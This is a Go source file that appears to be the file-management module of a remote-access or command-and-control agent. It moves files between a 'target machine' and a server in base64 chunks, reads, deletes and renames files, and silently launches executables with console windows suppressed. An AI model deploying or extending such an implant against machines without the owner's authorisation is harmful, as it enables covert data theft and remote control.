package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// DownloadChunkSize is the raw byte size of one download chunk (base64 expands
// it to ~683KB per result, well under the protocol packet limit).
const DownloadChunkSize = 512 * 1024

// downloadBlock is one chunk of a file downloaded from the agent to the server.
type downloadBlock struct {
	Index    int    `json:"index"`
	Total    int    `json:"total"`
	Filename string `json:"filename"`
	Data     string `json:"data"` // base64 encoded raw bytes
}

// uploadBlock is one chunk of a file uploaded from the server to the agent.
type uploadBlock struct {
	Path  string `json:"path"`
	Index int    `json:"index"`
	Total int    `json:"total"`
	Data  string `json:"data"` // base64 encoded raw bytes
}

// execUpload writes one chunk of an uploaded file to the target machine.
// Chunks are written sequentially: index 0 truncates, later chunks append.
func (d *Dispatcher) execUpload(argsJSON string) string {
	var blk uploadBlock
	if err := json.Unmarshal([]byte(argsJSON), &blk); err != nil {
		return fmt.Sprintf("error: invalid args: %v", err)
	}
	if blk.Path == "" {
		return "error: no path specified"
	}
	if blk.Data == "" {
		return "error: no data specified"
	}
	if hasPathTraversal(blk.Path) {
		return "error: path traversal is not allowed"
	}

	data, err := base64.StdEncoding.DecodeString(blk.Data)
	if err != nil {
		return fmt.Sprintf("error: decode data: %v", err)
	}

	// Ensure the parent directory exists
	if dir := filepath.Dir(blk.Path); dir != "" && dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Sprintf("error: mkdir: %v", err)
		}
	}

	flag := os.O_CREATE | os.O_WRONLY
	if blk.Index == 0 {
		flag |= os.O_TRUNC
	} else {
		flag |= os.O_APPEND
	}

	f, err := os.OpenFile(blk.Path, flag, 0644)
	if err != nil {
		return fmt.Sprintf("error: open: %v", err)
	}
	defer f.Close()

	if _, err := f.Write(data); err != nil {
		return fmt.Sprintf("error: write: %v", err)
	}

	if blk.Index == blk.Total-1 {
		return fmt.Sprintf("upload complete: %s", blk.Path)
	}
	return fmt.Sprintf("chunk %d/%d written: %s", blk.Index+1, blk.Total, blk.Path)
}

// execDownload reads a file on the agent and reports it back to the server in
// chunks. Small files fit in a single result; larger files are queued so the
// remaining chunks are sent on subsequent checkins.
func (d *Dispatcher) execDownload(task *Task) *Result {
	path := extractPathArg(task.Args)
	if path == "" {
		return &Result{TaskID: task.ID, Output: "error: no file specified", Status: "failed"}
	}
	if !filepath.IsAbs(path) && d.cwd != "" {
		path = filepath.Join(d.cwd, path)
	}
	if hasPathTraversal(path) {
		return &Result{TaskID: task.ID, Output: "error: path traversal is not allowed", Status: "failed"}
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return &Result{TaskID: task.ID, Output: fmt.Sprintf("error: %v", err), Status: "failed"}
	}

	filename := filepath.Base(path)
	total := (len(data) + DownloadChunkSize - 1) / DownloadChunkSize
	if total == 0 {
		total = 1
	}

	blocks := make([]downloadBlock, total)
	for i := 0; i < total; i++ {
		start := i * DownloadChunkSize
		end := start + DownloadChunkSize
		if end > len(data) {
			end = len(data)
		}
		blocks[i] = downloadBlock{
			Index:    i,
			Total:    total,
			Filename: filename,
			Data:     base64.StdEncoding.EncodeToString(data[start:end]),
		}
	}

	// First chunk returned immediately with status "downloading"; the rest are
	// queued and reported on the next checkins.
	first, _ := json.Marshal(blocks[0])
	queue := make([]Result, 0, total-1)
	for i := 1; i < total; i++ {
		blkJSON, _ := json.Marshal(blocks[i])
		queue = append(queue, Result{TaskID: task.ID, Output: string(blkJSON), Status: "downloading"})
	}
	d.queueBlocks(queue)

	return &Result{
		TaskID: task.ID,
		Output: string(first),
		Status: "downloading",
	}
}

// fsEntry is one row of a structured directory listing.
type fsEntry struct {
	Name  string `json:"name"`
	IsDir bool   `json:"is_dir"`
	Size  int64  `json:"size"`
	Mod   string `json:"mod"` // modification time RFC3339
}

// rootsMarker is the special path the File Explorer's "home" button sends to
// list the filesystem roots (drives on Windows, "/" elsewhere).
const rootsMarker = "__roots__"

// execLsJSON returns a structured directory listing for the File Explorer.
func (d *Dispatcher) execLsJSON(argsJSON string) string {
	path := extractPathArg(argsJSON)
	if path == rootsMarker {
		return listRootsJSON()
	}
	if path == "" {
		if d.cwd != "" {
			path = d.cwd
		} else {
			path = "."
		}
	}
	absPath, err := filepath.Abs(path)
	if err != nil {
		return errorJSON("resolve path: " + err.Error())
	}

	entries, err := os.ReadDir(absPath)
	if err != nil {
		return errorJSON(err.Error())
	}

	items := make([]fsEntry, 0, len(entries))
	for _, e := range entries {
		info, err := e.Info()
		size := int64(0)
		mod := ""
		if err == nil {
			size = info.Size()
			mod = info.ModTime().Format(time.RFC3339)
		}
		items = append(items, fsEntry{Name: e.Name(), IsDir: e.IsDir(), Size: size, Mod: mod})
	}

	cwd := d.cwd
	if cwd == "" {
		cwd, _ = os.Getwd()
	}
	out, err := json.Marshal(map[string]any{
		"cwd":     cwd,
		"path":    absPath,
		"entries": items,
	})
	if err != nil {
		return errorJSON("marshal: " + err.Error())
	}
	return string(out)
}

// listRootsJSON returns the filesystem roots for the File Explorer's "home"
// view: drive letters on Windows ("C:\", "D:\", ...) or the single "/" root on
// Unix. The returned "path" is the marker itself so the frontend knows it is
// showing the roots view.
func listRootsJSON() string {
	cwd, _ := os.Getwd()
	items := make([]fsEntry, 0, 8)

	if runtime.GOOS == "windows" {
		for d := 'A'; d <= 'Z'; d++ {
			root := fmt.Sprintf("%c:\\", d)
			if _, err := os.Stat(root); err == nil {
				items = append(items, fsEntry{Name: root, IsDir: true})
			}
		}
	} else {
		items = append(items, fsEntry{Name: "/", IsDir: true})
	}

	out, err := json.Marshal(map[string]any{
		"cwd":     cwd,
		"path":    rootsMarker,
		"entries": items,
	})
	if err != nil {
		return errorJSON("marshal: " + err.Error())
	}
	return string(out)
}

// execMkdir creates a directory (and parents).
func (d *Dispatcher) execMkdir(argsJSON string) string {
	path := extractPathArg(argsJSON)
	if path == "" {
		return "error: no path specified"
	}
	if hasPathTraversal(path) {
		return "error: path traversal is not allowed"
	}
	if err := os.MkdirAll(path, 0755); err != nil {
		return "error: " + err.Error()
	}
	return "directory created: " + path
}

// execRm removes a file or directory (recursively for directories).
func (d *Dispatcher) execRm(argsJSON string) string {
	path := extractPathArg(argsJSON)
	if path == "" {
		return "error: no path specified"
	}
	if hasPathTraversal(path) {
		return "error: path traversal is not allowed"
	}
	if err := os.RemoveAll(path); err != nil {
		return "error: " + err.Error()
	}
	return "removed: " + path
}

// execRename renames or moves a file/directory.
func (d *Dispatcher) execRename(argsJSON string) string {
	var args struct {
		OldPath string `json:"old_path"`
		NewPath string `json:"new_path"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return "error: invalid args"
	}
	if args.OldPath == "" || args.NewPath == "" {
		return "error: old_path and new_path required"
	}
	if hasPathTraversal(args.OldPath) || hasPathTraversal(args.NewPath) {
		return "error: path traversal is not allowed"
	}
	if err := os.Rename(args.OldPath, args.NewPath); err != nil {
		return "error: " + err.Error()
	}
	return "renamed: " + args.OldPath + " -> " + args.NewPath
}

// execExecFile launches an executable on the target machine without waiting.
func (d *Dispatcher) execExecFile(argsJSON string) string {
	path := extractPathArg(argsJSON)
	if path == "" {
		return "error: no file specified"
	}
	cmd := exec.Command(path)
	// Suppress the console flash when launching console-mode children from the
	// windowless agent (CREATE_NO_WINDOW); GUI programs are unaffected.
	cmd.SysProcAttr = noWindowAttr()
	if err := cmd.Start(); err != nil {
		return "error: " + err.Error()
	}
	go func() { _ = cmd.Wait() }()
	return "started: " + path + " (pid " + fmt.Sprintf("%d", cmd.Process.Pid) + ")"
}

// errorJSON wraps an error message as a minimal structured failure result.
func errorJSON(msg string) string {
	out, _ := json.Marshal(map[string]string{"error": msg})
	return string(out)
}

// extractPathArg parses an args JSON of the form {"path":"..."} or a plain path.
// The returned path is normalized for the agent's platform (see normalizePath).
func extractPathArg(argsJSON string) string {
	var p string
	if argsJSON != "" {
		var args map[string]string
		if json.Unmarshal([]byte(argsJSON), &args) == nil {
			if v := args["path"]; v != "" {
				p = v
			} else if v := args["file"]; v != "" {
				p = v
			}
		}
		// Fall back to treating the raw args as a path
		if p == "" && !strings.HasPrefix(strings.TrimSpace(argsJSON), "{") {
			p = strings.TrimSpace(argsJSON)
		}
	}
	return normalizePath(p)
}

// normalizePath adapts a path from the operator UI to the agent's platform. The
// frontend joins paths with a platform-dependent separator, but a Windows-style
// backslash sent to a Linux agent becomes part of the file name (Linux treats
// '\' as a valid character) — so "/home/user\file" silently fails to open.
// On non-Windows platforms every backslash is converted to '/'.
func normalizePath(p string) string {
	if p == "" {
		return ""
	}
	if runtime.GOOS != "windows" {
		p = strings.ReplaceAll(p, "\\", "/")
	}
	return p
}

// hasPathTraversal rejects absolute path separators used for ".." escapes.
func hasPathTraversal(p string) bool {
	for _, part := range strings.FieldsFunc(p, func(r rune) bool {
		return r == '/' || r == '\\'
	}) {
		if part == ".." {
			return true
		}
	}
	return false
}

func (d *Dispatcher) execLs(argsJSON string) string {
	dir := d.getTargetDir(argsJSON)

	entries, err := os.ReadDir(dir)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	var sb strings.Builder
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		typeStr := "F"
		if e.IsDir() {
			typeStr = "D"
		}
		sb.WriteString(fmt.Sprintf("%s  %10d  %s  %s\n",
			typeStr,
			info.Size(),
			info.ModTime().Format("2006-01-02 15:04"),
			e.Name(),
		))
	}
	return strings.TrimRight(sb.String(), "\n")
}

func (d *Dispatcher) execCd(argsJSON string) string {
	var args map[string]string
	json.Unmarshal([]byte(argsJSON), &args)

	dir := args["path"]
	if dir == "" {
		dir = args["dir"]
	}
	if dir == "" {
		return "error: no path specified"
	}

	// Resolve relative to current cwd
	if !filepath.IsAbs(dir) && d.cwd != "" {
		dir = filepath.Join(d.cwd, dir)
	}

	// Verify directory exists
	info, err := os.Stat(dir)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}
	if !info.IsDir() {
		return fmt.Sprintf("error: %s is not a directory", dir)
	}

	d.cwd = dir
	return dir
}

// execPwd returns the current working directory.
func (d *Dispatcher) execPwd() string {
	if d.cwd != "" {
		return d.cwd
	}
	dir, _ := os.Getwd()
	return dir
}

func (d *Dispatcher) execCat(argsJSON string) string {
	var args map[string]string
	json.Unmarshal([]byte(argsJSON), &args)

	path := args["path"]
	if path == "" {
		path = args["file"]
	}
	if path == "" {
		return "error: no file specified"
	}

	if !filepath.IsAbs(path) && d.cwd != "" {
		path = filepath.Join(d.cwd, path)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("error: %v", err)
	}

	// Limit output size
	if len(data) > 1024*1024 {
		return decodeToUTF8(data[:1024*1024]) + "\n... [truncated at 1MB]"
	}
	return decodeToUTF8(data)
}

func (d *Dispatcher) getTargetDir(argsJSON string) string {
	if argsJSON != "" {
		var args map[string]string
		if json.Unmarshal([]byte(argsJSON), &args) == nil {
			if p := args["path"]; p != "" {
				if !filepath.IsAbs(p) && d.cwd != "" {
					return filepath.Join(d.cwd, p)
				}
				return p
			}
		}
	}
	if d.cwd != "" {
		return d.cwd
	}
	dir, _ := os.Getwd()
	return dir
}
